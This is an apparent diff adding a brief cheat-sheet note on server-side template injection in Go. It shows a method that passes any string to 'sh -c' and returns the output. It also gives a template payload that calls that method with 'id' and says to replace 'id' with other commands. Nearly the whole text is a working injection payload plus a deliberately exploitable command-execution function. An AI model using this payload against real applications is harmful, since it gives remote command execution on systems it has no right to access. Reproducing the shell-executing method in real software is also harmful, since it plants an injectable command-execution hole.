@@ -1,0 +1,11 @@
+SSTI golang :
+
+func (p RequestData) FetchServerInfo(command string) string {
+	out, err := exec.Command("sh", "-c", command).Output()
+	if err != nil {
+		return ""
+	}
+	return string(out)
+}
+
+pauload : {{ .FetchServerInfo "id" }} -> replace id with specific command to tracce around
